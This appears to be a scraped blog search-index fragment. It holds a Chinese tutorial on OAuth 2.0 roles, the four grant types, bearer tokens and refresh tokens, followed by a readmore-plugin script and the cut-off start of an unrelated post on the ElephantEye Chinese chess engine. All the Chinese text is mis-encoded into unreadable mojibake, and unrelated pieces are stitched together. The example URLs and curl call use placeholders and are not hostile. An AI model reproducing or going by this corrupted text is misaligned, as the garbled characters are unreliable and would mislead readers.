OAuth 2.0 ä¸æ²¾äº²å¸¦æ•…ï¼Œå¯ä»¥æ˜¯ä»»ä½•ç‹¬ç«‹çš„ç³»ç»Ÿï¼Œæ¯”å¦‚æˆ‘ä»¬è‡ªå·±çš„æŸä¸ªç³»ç»Ÿï¼Œæˆ–è€…æŸä¸ª APP å®¢æˆ·ç«¯æˆ–è€…æ˜¯ Web å®¢æˆ·ç«¯ èµ„æºæ‹¥æœ‰è€…ï¼šå°±æ˜¯æŒ‡æˆ‘ä»¬çš„ç”¨æˆ·ï¼Œæ¯”å¦‚å¾®ä¿¡ç™»å½•ä¸­ï¼Œåœ¨é¢å¯¹å¾®ä¿¡çš„æ•°æ®åº“æ—¶ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿå°±æ˜¯æ— å…³äººå‘˜ï¼›è€Œç™»å½•çš„ç”¨æˆ·ï¼Œåœ¨å¾®ä¿¡çš„ç³»ç»Ÿä¸­å°±æ˜¯è¯¥ç”¨æˆ·ä¿¡æ¯çš„èµ„æºæ‹¥æœ‰è€…ï¼Œä»–æŒæ¡ç€æ˜¯å¦å°†ä»–çš„å¾®ä¿¡ä¸ªäººä¿¡æ¯æš´éœ²ç»™æˆ‘ä»¬çš„ç³»ç»Ÿ è®¤è¯æœåŠ¡å™¨ï¼šåœ¨å¾®ä¿¡ç™»å½•ä¸­ï¼Œå°±æ˜¯ç”¨æ¥è¾¨åˆ«ç”¨æˆ·çš„è®¤è¯æ˜¯å¦æ­£ç¡®ï¼Œæ˜¯å¦å¯ä»¥æˆä¸ºè¯¥å¾®ä¿¡ç”¨æˆ·ä¿¡æ¯çš„èµ„æºæ‹¥æœ‰è€…ï¼›è¯¥ç³»ç»Ÿç”±å¾®ä¿¡ç³»ç»Ÿæä¾›ï¼Œç”¨äºé‰´åˆ«èµ„æºæ‹¥æœ‰è€…çš„èº«ä»½åˆæ³•æ€§ èµ„æºæœåŠ¡å™¨ï¼šå®ˆæŠ¤è¯¥å¾®ä¿¡ç”¨æˆ·ä¿¡æ¯çš„æœåŠ¡å™¨ï¼Œå®ƒæŒæ¡ç€å¾®ä¿¡çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæˆ‘ä»¬çš„å®¢æˆ·ç«¯æœ€åå°±æ˜¯å‘ä»–å‘èµ·è¯·æ±‚ï¼Œåƒé¢å¯¹ç”²æ–¹ä¸€æ ·ï¼Œæ±‚ç€å®ƒç»™æˆ‘ä»¬å“åº”è¯¥ç”¨æˆ·çš„å¾®ä¿¡ä¸ªäººä¿¡æ¯ OAuth 2.0 å®ç°ç¬¬ä¸‰æ–¹ç™»å½•çš„æµç¨‹ä»¥å¾®ä¿¡ç¬¬ä¸‰æ–¹ç™»å½•ä¸ºåˆ—å­ï¼Œå…·ä½“çš„æµç¨‹å¦‚ä¸‹ï¼Œç‚¹å‡»æŸ¥çœ‹æµç¨‹å›¾ï¼š é¦–å…ˆç”¨æˆ·ï¼Œç™»å½•æˆ‘ä»¬çš„å®¢æˆ·ç«¯ï¼Œç‚¹å‡»å¾®ä¿¡ç™»å½• æˆ‘ä»¬çš„å®¢æˆ·ç«¯è¯·æ±‚å¾®ä¿¡çš„æˆæƒæœåŠ¡å™¨ï¼Œå“åº”ä¸€ä¸ªäºŒç»´ç ç»™ç”¨æˆ·ï¼Œç”¨æˆ·æ‰«ç åç‚¹å‡»åŒæ„ å¾®ä¿¡çš„æˆæƒæœåŠ¡å™¨ä¼šå¯¹è¯¥å¾®ä¿¡ç”¨æˆ·è¿›è¡ŒéªŒè¯ éªŒè¯é€šè¿‡åï¼Œè¿”å›ä¸€ä¸ªè¯¢é—®é¡µé¢ï¼Œæ˜¯å¦æˆæƒç»™æŸæŸç³»ç»Ÿ ç”¨æˆ·ç‚¹å‡»ç¡®è®¤ï¼ŒæˆæƒæœåŠ¡å™¨å°±ä¼šé¢å‘ä¸€ä¸ªæˆæƒç ç»™æˆ‘ä»¬çš„å®¢æˆ·ç«¯ï¼Œå¹¶é‡å®šå‘æˆ‘ä»¬çš„ç³»ç»Ÿ æ­¤æ—¶æˆ‘ä»¬çš„å®¢æˆ·ç«¯è·å¾—æˆæƒç ï¼Œæ ¹æ®æˆæƒç å»å¾®ä¿¡çš„è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œ å¾®ä¿¡çš„è®¤è¯æœåŠ¡å™¨è®¤è¯é€šè¿‡åï¼Œä¼šé¢å‘ä¸€ä¸ªä»¤ç‰Œç»™æˆ‘ä»¬çš„ç³»ç»Ÿ å½“æˆ‘ä»¬çš„ç³»ç»Ÿæ‹¿åˆ°ä»¤ç‰Œæ—¶ï¼Œä¹Ÿå°±æ˜¯å¾®ä¿¡ç™»å½•æˆåŠŸä¹‹æ—¶ è¯¥ä»¤ç‰Œä»£è¡¨ç€æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œæœ‰æƒè®¿é—®è¯¥å¾®ä¿¡ç”¨æˆ·åœ¨å¾®ä¿¡ä¸­çš„ä¸ªäººä¿¡æ¯æ•°æ® æˆ‘ä»¬çš„å®¢æˆ·ç«¯æºå¸¦ä»¤ç‰Œå»å¾®ä¿¡çš„èµ„æºæœåŠ¡å™¨è·å–è¯¥å¾®ä¿¡ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯ å¾®ä¿¡èµ„æºæœåŠ¡å™¨æ ¡éªŒè¯¥ä»¤ç‰Œçš„åˆæ³•æ€§ï¼Œé€šè¿‡åå“åº”è¯¥ç”¨æˆ·çš„å¾®ä¿¡ä¸ªäººä¿¡æ¯æ•°æ®ç»™æˆ‘ä»¬çš„å®¢æˆ·ç«¯ OAuth2.0 å››ç§æˆæƒæ–¹å¼æˆæƒç æ¨¡å¼æˆæƒç æ¨¡å¼ï¼ˆauthorization_codeï¼‰æŒ‡çš„æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨å…ˆç”³è¯·ä¸€ä¸ªæˆæƒç ï¼Œç„¶åå†ç”¨è¯¥æˆæƒç æ¥è·å–ä»¤ç‰Œã€‚è¿™ç§æ–¹å¼æ˜¯æœ€å¸¸ç”¨çš„æµç¨‹ï¼Œå®‰å…¨æ€§ä¹Ÿæœ€é«˜ï¼Œå®ƒé€‚ç”¨äºé‚£äº›æœ‰åç«¯çš„ Web åº”ç”¨ã€‚æˆæƒç é€šè¿‡å‰ç«¯ä¼ é€ï¼Œä»¤ç‰Œåˆ™æ˜¯å‚¨å­˜åœ¨åç«¯ï¼Œè€Œä¸”æ‰€æœ‰ä¸èµ„æºæœåŠ¡å™¨çš„é€šä¿¡éƒ½åœ¨åç«¯å®Œæˆã€‚è¿™æ ·çš„å‰åç«¯åˆ†ç¦»ï¼Œå¯ä»¥é¿å…ä»¤ç‰Œæ³„æ¼ã€‚ ç¬¬ä¸€æ­¥ï¼ŒA ç½‘ç«™æä¾›ä¸€ä¸ªé“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»åå°±ä¼šè·³è½¬åˆ° B ç½‘ç«™ï¼Œæˆæƒç”¨æˆ·æ•°æ®ç»™ A ç½‘ç«™ä½¿ç”¨ã€‚ä¸‹é¢å°±æ˜¯ A ç½‘ç«™è·³è½¬ B ç½‘ç«™çš„ä¸€ä¸ªç¤ºæ„é“¾æ¥ã€‚ 12345https://b.com/oauth/authorize? response_type=code&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL&amp; scope=read åœ¨ä¸Šé¢çš„ URL ä¸­ï¼Œresponse_type å‚æ•°è¡¨ç¤ºè¦æ±‚è¿”å›æˆæƒç ï¼ˆcodeï¼‰ï¼Œclient_id å‚æ•°è®© B çŸ¥é“æ˜¯è°åœ¨è¯·æ±‚ï¼Œredirect_uri å‚æ•°æ˜¯ B æ¥å—æˆ–æ‹’ç»è¯·æ±‚åçš„è·³è½¬ç½‘å€ï¼Œscope å‚æ•°è¡¨ç¤ºè¦æ±‚çš„æˆæƒèŒƒå›´ï¼ˆè¿™é‡Œæ˜¯åªè¯»ï¼‰ã€‚ ç¬¬äºŒæ­¥ï¼Œç”¨æˆ·è·³è½¬åï¼ŒB ç½‘ç«™ä¼šè¦æ±‚ç”¨æˆ·ç™»å½•ï¼Œç„¶åè¯¢é—®æ˜¯å¦åŒæ„ç»™äºˆ A ç½‘ç«™æˆæƒã€‚ç”¨æˆ·è¡¨ç¤ºåŒæ„ï¼Œè¿™æ—¶ B ç½‘ç«™å°±ä¼šè·³å› redirect_uri å‚æ•°æŒ‡å®šçš„ç½‘å€ã€‚è·³è½¬æ—¶ï¼Œä¼šä¼ å›ä¸€ä¸ªæˆæƒç ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚ 1https://a.com/callback?code=AUTHORIZATION_CODE ä¸Šé¢ URL ä¸­ï¼Œcode å‚æ•°å°±æ˜¯æˆæƒç ã€‚ ç¬¬ä¸‰æ­¥ï¼ŒA ç½‘ç«™æ‹¿åˆ°æˆæƒç ä»¥åï¼Œå°±å¯ä»¥åœ¨åç«¯å‘ B ç½‘ç«™ç”³è¯·ä»¤ç‰Œã€‚ 123456https://b.com/oauth/token? client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET&amp; grant_type=authorization_code&amp; code=AUTHORIZATION_CODE&amp; redirect_uri=CALLBACK_URL ä¸Šé¢ URL ä¸­ï¼Œclient_id å‚æ•°å’Œ client_secret å‚æ•°ç”¨æ¥è®© B ç¡®è®¤ A çš„èº«ä»½ï¼ˆclient_secret å‚æ•°æ˜¯ä¿å¯†çš„ï¼Œå› æ­¤åªèƒ½åœ¨åç«¯å‘è¯·æ±‚ï¼‰ï¼Œgrant_type å‚æ•°çš„å€¼æ˜¯ authorization_codeï¼Œè¡¨ç¤ºé‡‡ç”¨çš„æˆæƒæ–¹å¼æ˜¯æˆæƒç ï¼Œcode å‚æ•°æ˜¯ä¸Šä¸€æ­¥æ‹¿åˆ°çš„æˆæƒç ï¼Œredirect_uri å‚æ•°æ˜¯ä»¤ç‰Œé¢å‘åçš„å›è°ƒç½‘å€ã€‚ ç¬¬å››æ­¥ï¼ŒB ç½‘ç«™æ”¶åˆ°è¯·æ±‚ä»¥åï¼Œå°±ä¼šé¢å‘ä»¤ç‰Œã€‚å…·ä½“åšæ³•æ˜¯å‘ redirect_uri æŒ‡å®šçš„ç½‘å€ï¼Œå‘é€ä¸€æ®µ JSON æ•°æ®ã€‚ 12345678910{ "access_token":"ACCESS_TOKEN", "token_type":"bearer", "expires_in":2592000, "refresh_token":"REFRESH_TOKEN", "scope":"read", "uid":100101, "info":{...}} ä¸Šé¢ JSON æ•°æ®ä¸­ï¼Œaccess_token å­—æ®µå°±æ˜¯ä»¤ç‰Œï¼ŒA ç½‘ç«™åœ¨åç«¯æ‹¿åˆ°äº†ã€‚ ç®€åŒ–æ¨¡å¼æœ‰äº› Web åº”ç”¨æ˜¯çº¯å‰ç«¯åº”ç”¨ï¼Œæ²¡æœ‰åç«¯ã€‚è¿™æ—¶å°±ä¸èƒ½ç”¨ä¸Šé¢çš„æ–¹å¼äº†ï¼Œå¿…é¡»å°†ä»¤ç‰Œå‚¨å­˜åœ¨å‰ç«¯ï¼Œå› æ­¤ OAuth 2.0 å…è®¸ç›´æ¥å‘å‰ç«¯é¢å‘ä»¤ç‰Œã€‚è¿™ç§æ–¹å¼æ²¡æœ‰æˆæƒç è¿™ä¸ªä¸­é—´æ­¥éª¤ï¼Œæ‰€ä»¥ç§°ä¸ºï¼ˆæˆæƒç ï¼‰â€ ç®€åŒ–æ¨¡å¼ï¼ˆimplicitï¼‰â€ï¼Œä¹Ÿå«â€ éšè—æ¨¡å¼â€ã€‚ ç¬¬ä¸€æ­¥ï¼ŒA ç½‘ç«™æä¾›ä¸€ä¸ªé“¾æ¥ï¼Œè¦æ±‚ç”¨æˆ·è·³è½¬åˆ° B ç½‘ç«™ï¼Œå¹¶è¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•ï¼Œä¸‹é¢çš„ URL ä¸­ï¼Œresponse_type å‚æ•°ä¸º tokenï¼Œè¡¨ç¤ºè¦æ±‚ç›´æ¥è¿”å›ä»¤ç‰Œã€‚ 12345https://b.com/oauth/authorize? response_type=token&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL&amp; scope=read ç¬¬äºŒæ­¥ï¼Œç”¨æˆ·æˆåŠŸç™»å½•åï¼Œé€šè¿‡ä»¥ä¸‹ URL è·³è½¬åˆ° B ç½‘ç«™çš„æˆæƒé¡µé¢ï¼Œè¿™é‡Œçš„ URL ä¸å†éœ€è¦ scope å‚æ•°ã€‚ 1234https://b.com/oauth/authorize? response_type=token&amp; client_id=CLIENT_ID&amp; redirect_uri=CALLBACK_URL ç¬¬ä¸‰æ­¥ï¼šç”¨æˆ·åŒæ„æˆæƒç”¨æˆ·æ•°æ®ç»™ A ç½‘ç«™ä½¿ç”¨ï¼Œè¿™æ—¶ B ç½‘ç«™å°±ä¼šè·³å› redirect_uri å‚æ•°æŒ‡å®šçš„è·³è½¬ç½‘å€ï¼Œå¹¶ä¸”æŠŠä»¤ç‰Œä½œä¸º URL å‚æ•°ä¼ ç»™ A ç½‘ç«™ã€‚ 1https://a.com/callback#token=ACCESS_TOKEN ä¸Šé¢çš„ URL ä¸­ï¼Œtoken å‚æ•°å°±æ˜¯ä»¤ç‰Œï¼ŒA ç½‘ç«™å› æ­¤ç›´æ¥åœ¨å‰ç«¯æ‹¿åˆ°ä»¤ç‰Œã€‚æ³¨æ„ï¼Œä»¤ç‰Œçš„ä½ç½®æ˜¯ URL é”šç‚¹ï¼ˆfragmentï¼‰ï¼Œè€Œä¸æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquerystringï¼‰ï¼Œè¿™æ˜¯å› ä¸º OAuth 2.0 å…è®¸è·³è½¬ç½‘å€æ˜¯ HTTP åè®®ï¼Œå› æ­¤å­˜åœ¨â€ ä¸­é—´äººæ”»å‡»â€ çš„é£é™©ï¼Œè€Œæµè§ˆå™¨è·³è½¬æ—¶ï¼Œé”šç‚¹ä¸ä¼šå‘åˆ°æœåŠ¡å™¨ï¼Œå°±å‡å°‘äº†æ³„æ¼ä»¤ç‰Œçš„é£é™©ã€‚ è¿™ç§æ–¹å¼æŠŠä»¤ç‰Œç›´æ¥ä¼ ç»™å‰ç«¯ï¼Œæ˜¯å¾ˆä¸å®‰å…¨çš„ã€‚å› æ­¤ï¼Œåªèƒ½ç”¨äºä¸€äº›å®‰å…¨è¦æ±‚ä¸é«˜çš„åœºæ™¯ï¼Œå¹¶ä¸”ä»¤ç‰Œçš„æœ‰æ•ˆæœŸå¿…é¡»éå¸¸çŸ­ï¼Œé€šå¸¸å°±æ˜¯ä¼šè¯æœŸé—´ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨å…³æ‰ï¼Œä»¤ç‰Œå°±å¤±æ•ˆäº†ã€‚ å¯†ç æ¨¡å¼å¦‚æœç”¨æˆ·é«˜åº¦ä¿¡ä»»æŸä¸ªåº”ç”¨ï¼ŒOAuth 2.0 ä¹Ÿå…è®¸ç”¨æˆ·æŠŠç”¨æˆ·åå’Œå¯†ç ï¼Œç›´æ¥å‘Šè¯‰è¯¥åº”ç”¨ã€‚è¯¥åº”ç”¨å°±ä½¿ç”¨ç”¨æˆ·çš„å¯†ç ï¼Œç”³è¯·ä»¤ç‰Œï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºâ€ å¯†ç å¼â€ï¼ˆpasswordï¼‰ã€‚ ç¬¬ä¸€æ­¥ï¼ŒA ç½‘ç«™è¦æ±‚ç”¨æˆ·æä¾› B ç½‘ç«™çš„ç”¨æˆ·åå’Œå¯†ç ã€‚æ‹¿åˆ°ä»¥åï¼ŒA å°±ç›´æ¥å‘ B è¯·æ±‚ä»¤ç‰Œã€‚ä¸‹é¢çš„ URL ä¸­ï¼Œgrant_type å‚æ•°æ˜¯æˆæƒæ–¹å¼ï¼Œè¿™é‡Œçš„ password è¡¨ç¤ºâ€ å¯†ç æ¨¡å¼â€ï¼Œusername å’Œ password æ˜¯ B çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ 12345https://oauth.b.com/token? grant_type=password&amp; username=USERNAME&amp; password=PASSWORD&amp; client_id=CLIENT_ID ç¬¬äºŒæ­¥ï¼ŒB ç½‘ç«™éªŒè¯èº«ä»½é€šè¿‡åï¼Œç›´æ¥ç»™å‡ºä»¤ç‰Œã€‚æ³¨æ„ï¼Œè¿™æ—¶ä¸éœ€è¦è·³è½¬ï¼Œè€Œæ˜¯æŠŠä»¤ç‰Œæ”¾åœ¨ JSON æ•°æ®é‡Œé¢ï¼Œä½œä¸º HTTP å›åº”ï¼ŒA å› æ­¤æ‹¿åˆ°ä»¤ç‰Œã€‚è¿™ç§æ–¹å¼éœ€è¦ç”¨æˆ·ç»™å‡ºè‡ªå·±çš„ç”¨æˆ·å / å¯†ç ï¼Œæ˜¾ç„¶é£é™©å¾ˆå¤§ï¼Œå› æ­¤åªé€‚ç”¨äºå…¶ä»–æˆæƒæ–¹å¼éƒ½æ— æ³•é‡‡ç”¨çš„æƒ…å†µï¼Œè€Œä¸”å¿…é¡»æ˜¯ç”¨æˆ·é«˜åº¦ä¿¡ä»»çš„åº”ç”¨ã€‚ å®¢æˆ·ç«¯æ¨¡å¼å®¢æˆ·ç«¯æ¨¡å¼ï¼ˆclient_credentialsï¼‰ä¹Ÿå«å‡­è¯æ¨¡å¼ï¼Œé€‚ç”¨äºæ²¡æœ‰å‰ç«¯çš„å‘½ä»¤è¡Œåº”ç”¨ï¼Œå³åœ¨å‘½ä»¤è¡Œä¸‹è¯·æ±‚ä»¤ç‰Œã€‚ ç¬¬ä¸€æ­¥ï¼ŒA åº”ç”¨åœ¨å‘½ä»¤è¡Œå‘ B å‘å‡ºè¯·æ±‚ã€‚ä¸‹é¢çš„ URL ä¸­ï¼Œgrant_type å‚æ•°ç­‰äº client_credentials è¡¨ç¤ºé‡‡ç”¨å‡­è¯å¼ï¼Œclient_id å’Œ client_secret ç”¨æ¥è®© B ç¡®è®¤ A çš„èº«ä»½ã€‚ 1234https://oauth.b.com/token? grant_type=client_credentials&amp; client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET ç¬¬äºŒæ­¥ï¼ŒB ç½‘ç«™éªŒè¯é€šè¿‡ä»¥åï¼Œç›´æ¥è¿”å›ä»¤ç‰Œã€‚è¿™ç§æ–¹å¼ç»™å‡ºçš„ä»¤ç‰Œï¼Œæ˜¯é’ˆå¯¹ç¬¬ä¸‰æ–¹åº”ç”¨çš„ï¼Œè€Œä¸æ˜¯é’ˆå¯¹ç”¨æˆ·çš„ï¼Œå³æœ‰å¯èƒ½å¤šä¸ªç”¨æˆ·å…±äº«åŒä¸€ä¸ªä»¤ç‰Œã€‚ OAuth 2.0 ä»¤ç‰Œçš„ä½¿ç”¨æºå¸¦ä»¤ç‰ŒA ç½‘ç«™æ‹¿åˆ°ä»¤ç‰Œä»¥åï¼Œå°±å¯ä»¥å‘ B ç½‘ç«™çš„ API è¯·æ±‚æ•°æ®äº†ã€‚æ­¤æ—¶ï¼Œæ¯ä¸ªå‘åˆ° API çš„è¯·æ±‚ï¼Œéƒ½å¿…é¡»å¸¦æœ‰ä»¤ç‰Œã€‚å…·ä½“åšæ³•æ˜¯åœ¨è¯·æ±‚çš„å¤´ä¿¡æ¯ï¼ŒåŠ ä¸Šä¸€ä¸ª Authorization å­—æ®µï¼Œä»¤ç‰Œå°±æ”¾åœ¨è¿™ä¸ªå­—æ®µé‡Œé¢ã€‚ä¸‹é¢çš„å‘½ä»¤ä¸­ï¼ŒACCESS_TOKEN å°±æ˜¯æ‹¿åˆ°çš„ä»¤ç‰Œã€‚ 1curl -H "Authorization: Bearer ACCESS_TOKEN" "https://api.b.com" æ›´æ–°ä»¤ç‰Œä»¤ç‰Œçš„æœ‰æ•ˆæœŸåˆ°äº†ï¼Œå¦‚æœè®©ç”¨æˆ·é‡æ–°èµ°ä¸€éä¸Šé¢çš„æµç¨‹ï¼Œå†ç”³è¯·ä¸€ä¸ªæ–°çš„ä»¤ç‰Œï¼Œå¾ˆå¯èƒ½ä½“éªŒä¸å¥½ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰å¿…è¦ã€‚OAuth 2.0 å…è®¸ç”¨æˆ·è‡ªåŠ¨æ›´æ–°ä»¤ç‰Œã€‚å…·ä½“æ–¹æ³•æ˜¯ï¼ŒB ç½‘ç«™é¢å‘ä»¤ç‰Œçš„æ—¶å€™ï¼Œä¸€æ¬¡æ€§é¢å‘ä¸¤ä¸ªä»¤ç‰Œï¼Œä¸€ä¸ªç”¨äºè·å–æ•°æ®ï¼Œå¦ä¸€ä¸ªç”¨äºè·å–æ–°çš„ä»¤ç‰Œï¼ˆrefresh_token å­—æ®µï¼‰ã€‚ä»¤ç‰Œåˆ°æœŸå‰ï¼Œç”¨æˆ·ä½¿ç”¨ refresh_token å‘ä¸€ä¸ªè¯·æ±‚ï¼Œå»æ›´æ–°ä»¤ç‰Œã€‚ 12345https://b.com/oauth/token? grant_type=refresh_token&amp; client_id=CLIENT_ID&amp; client_secret=CLIENT_SECRET&amp; refresh_token=REFRESH_TOKEN ä¸Šé¢ URL ä¸­ï¼Œgrant_type å‚æ•°ä¸º refresh_token è¡¨ç¤ºè¦æ±‚æ›´æ–°ä»¤ç‰Œï¼Œclient_id å‚æ•°å’Œ client_secret å‚æ•°ç”¨äºç¡®è®¤èº«ä»½ï¼Œrefresh_token å‚æ•°å°±æ˜¯ç”¨äºæ›´æ–°ä»¤ç‰Œçš„ä»¤ç‰Œã€‚B ç½‘ç«™éªŒè¯é€šè¿‡ä»¥åï¼Œå°±ä¼šé¢å‘æ–°çš„ä»¤ç‰Œã€‚ OAuth 2.0 ä¸ JWT çš„å…³ç³» OAuth 2.0 æ˜¯ä¸€ç§è®¤è¯æˆæƒçš„åè®®è§„èŒƒ JWT æ˜¯åŸºäº Token çš„å®‰å…¨è®¤è¯åè®®çš„å®ç° OAuth 2.0 çš„è®¤è¯æœåŠ¡å™¨ç­¾å‘çš„ Token å¯ä»¥ä½¿ç”¨ JWT æ¥å®ç°ï¼ŒJWT è½»é‡ä¸”å®‰å…¨ã€‚ å‚è€ƒåšå®¢ OAuth 2.0 çš„ä¸€ä¸ªç®€å•è§£é‡Š OAuth 2.0 çš„å››ç§æˆæƒæ–¹å¼ OAuth 2.0 æˆæƒæ¨¡å¼è®¿é—®ä¹‹æˆæƒç æ¨¡å¼ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"oauth"},{title:"ä¸­å›½è±¡æ£‹ä¹‹ä¸‰ ElephantEye å¼•æ“æ·±å…¥ç†è§£",url:"/posts/df343bc0.html",text:'ä¸Šç¯‡ ä¸­å›½è±¡æ£‹ä¹‹äºŒå¼€æº AI å¼•æ“ä»‹ç» ä¸€ã€ç®€ä»‹ElephantEye æ˜¯ä¸€æ¬¾è‡ªç”±çš„ä¸­å›½è±¡æ£‹ç¨‹åºï¼Œåœ¨éµå¾ªã€ŠGNU å®½æ¾é€šç”¨å…¬å…±è®¸å¯åè®®ã€‹(GNU Lesser General Public Licence) çš„å‰æä¸‹ï¼Œå¹¿å¤§è±¡æ£‹çˆ±å¥½è€…å’Œç¨‹åºè®¾è®¡å¸ˆå¯ä»¥è‡ªç”±ä½¿ç”¨ ElephantEye åŠå…¶æºç¨‹åºã€‚ElephantEye ä¸­æ–‡åç§°ä¸º â€œè±¡çœ¼â€ï¼Œå®ƒè·Ÿ â€œé©¬è…¿â€ å’Œ â€œç‚®æ¶å­â€ ä¸€èµ·æ„æˆäº†ä¸­å›½è±¡æ£‹ â€œæ£‹ç›˜ä¸Šçš„ç¬¬ä¸‰ç»´â€ã€‚ElephantEye é€šå¸¸ä¸ä¸€ä¸ªè±¡æ£‹æ£‹è°±ç¼–è¾‘è½¯ä»¶ ElephantBoard é…åˆä½¿ç”¨ï¼Œå¯“æ„æœ‰æ¿æœ‰çœ¼ (è‹±æ–‡ Board çš„æ„æ€æ˜¯ â€œæ¿â€)ã€‚æ³¨ï¼šç°åœ¨ ElephantBoard å·²æ›´åä¸º â€œè±¡æ£‹å·«å¸ˆâ€ äºŒã€å¼•æ“åè®®ElephantEye æ”¯æŒ UCCI 3.0ï¼Œæµ…çº¢è±¡æ£‹ç”¨æˆ·å¯é€šè¿‡ UCCI å¼•æ“é€‚é…å™¨ (UCCI2QH) è°ƒç”¨ ElephantEye å¼•æ“ï¼ŒUCCI å‘½ä»¤ä½¿ç”¨å¸®åŠ©å¦‚ä¸‹ã€‚ 123456789101112131415161718æ”¯æŒçš„UCCIå‘½ä»¤æœ‰ï¼š ucci setoption ... position {fen &lt;fen_str&gt; | startpos} [moves &lt;move_list&gt;] banmoves &lt;move_list&gt; go [ponder | draw] ... ponderhit [draw] | stop probe {fen &lt;fen_str&gt; | startpos} [moves &lt;move_list&gt;] quitå¯ä»¥è¿”å›çš„UCCIä¿¡æ¯æœ‰ï¼š id {name &lt;engine_name&gt; | version &lt;version_name&gt; | copyright &lt;copyright_info&gt; | author &lt;author_name&gt; | user &lt;user_name&gt;} option ... ucciok info ... pophash [bestmove &lt;best_move&gt;] [lowerbound &lt;value&gt; depth &lt;depth&gt;] [upperbound &lt;value&gt; depth &lt;depth&gt;] {nobestmove | bestmove &lt;best_move&gt; [ponder &lt;ponder_move&gt;] [draw | resign]} bye ä¸‰ã€å‚æ•°è®¾ç½®ElephantEye ä½œä¸º UCCI å¼•æ“ï¼Œæœ‰è‹¥å¹²å¯ä»¥è®¾ç½®çš„å‚æ•° (å¯ä»¥ç›´æ¥åœ¨ &lt; è±¡æ£‹å·«å¸ˆ&gt; ä¸­è®¾ç½®)ï¼š(1) å¼€å±€åº“ï¼š é»˜è®¤çš„å¼€å±€åº“ä¸º ElephantEye ç¨‹åº (ELEEYE.EXE) æ‰€åœ¨ç›®å½•ä¸‹çš„ BOOK.DATï¼Œå«æœ‰ 10,000 ä¸ªå¯¹ç§°å±€é¢çš„ç€æ³•ã€‚(2) æ€è€ƒæ—¶é—´ï¼š é™å®šæ€è€ƒæ·±åº¦é€šå¸¸ä¸æ˜¯å¾ˆå¥½çš„é€‰æ‹©ï¼Œå»ºè®®ç»™å®šé™æ—¶è®©ç¨‹åºè‡ªåŠ¨åˆ†é…æ—¶é—´ã€‚è€Œåœ¨è§£æ€å±€æˆ–åˆ†æå±€é¢æ—¶ï¼Œåˆ™å¯è®©ç¨‹åºæ— é™åˆ¶æ€è€ƒï¼Œå¹¶å¯éšæ—¶ä¸­æ­¢æ€è€ƒã€‚(3) ç½®æ¢è¡¨å¤§å°ï¼š å°½ç®¡ç½®æ¢è¡¨å¤§å°å¯¹ç¨‹åºçš„è¿è¡Œé€Ÿåº¦å½±å“ä¸å¤§ï¼Œé»˜è®¤ 16MB çš„è®¾ç½®å·²ç»è¶³å¤Ÿï¼Œä½† ElephantEye è¿˜æ˜¯æä¾›äº†è®¾ç½®ç½®æ¢è¡¨å¤§å°çš„åŠŸèƒ½ã€‚åœ¨å†…å­˜å…è®¸çš„æƒ…å†µä¸‹ï¼Œä¸‹æ…¢æ£‹æ—¶å¯ä»¥é€‚å½“å¢åŠ ç½®æ¢è¡¨çš„å¤§å°ï¼Œä½†å»ºè®®ä¸è¦è¶…è¿‡ç‰©ç†å†…å­˜çš„ä¸€åŠã€‚(3) è£å‰ªç¨‹åº¦ï¼š ä¸ºåŠ å¿«ç¨‹åºçš„è¿ç®—é€Ÿåº¦ï¼ŒElephantEye é»˜è®¤ä½¿ç”¨ç©ºç€è£å‰ªï¼Œå¹¶ä¸”äº§ç”Ÿè´Ÿé¢å½±å“çš„å¯èƒ½æ€§å¾ˆå°ã€‚åªæœ‰æœ€ä½çº§åˆ«ä¼šç¦ç”¨ç©ºç€è£å‰ªã€‚(4) çŸ¥è¯†é‡ï¼š çŸ¥è¯†é‡å’Œå±€é¢è¯„ä»·çš„å‡†ç¡®æ€§æœ‰å…³ï¼Œåœ¨ ElephantEye çš„çŸ¥è¯†é‡ç­‰çº§ä¸­ï¼Œåªæœ‰æœ€ä½çº§åˆ«æ˜¯ä¸é‡‡ç”¨å±€é¢è¯„ä»·å‡½æ•°çš„ (åªè€ƒè™‘å­åŠ›ä»·å€¼)ï¼Œåœ¨è§£æ’å±€ç­‰ä¸éœ€è¦ä¾é å®¡å±€çŸ¥è¯†æ¥åˆ†æçš„å±€é¢æ—¶ï¼Œå¯ä»¥å°è¯•ç”¨è¿™ç§è®¾ç½®ã€‚(5) éšæœºæ€§ï¼š ElephantEye è®¾æœ‰ 4 çº§éšæœºæ€§ã€‚éšæœºæ€§è¶Šå¤§ï¼Œç¨‹åºè¶Šæœ‰å¯èƒ½èµ°å‡ºå®ƒè®¤ä¸ºä¸æ˜¯æœ€å¥½çš„ç€æ³•ï¼Œä½† â€œä¸æ˜¯æœ€å¥½çš„ç€æ³•â€ 